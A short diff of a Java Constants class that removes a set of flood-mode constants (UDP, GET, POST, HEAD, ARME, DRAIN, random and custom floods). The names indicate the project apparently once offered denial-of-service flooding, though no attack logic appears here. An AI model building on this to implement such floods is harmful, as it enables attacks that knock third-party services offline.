@@ -4,16 +4,6 @@ import com.redpois0n.common.Version;
 
 public class Constants {
 
-	public static final int FLOOD_UDP = 0;
-	public static final int FLOOD_RANDOM = 1;
-	public static final int FLOOD_GET = 2;
-	public static final int FLOOD_POST = 3;
-	public static final int FLOOD_ARME = 4;
-	public static final int FLOOD_DRAIN = 5;
-	public static final int FLOOD_CUSTOM = 6;
-	public static final int FLOOD_NONE = -1;
-	public static final int FLOOD_HEAD = 7;
-
 	public static final int MODE_ENV = 0;
 	public static final int MODE_PROP = 1;
 
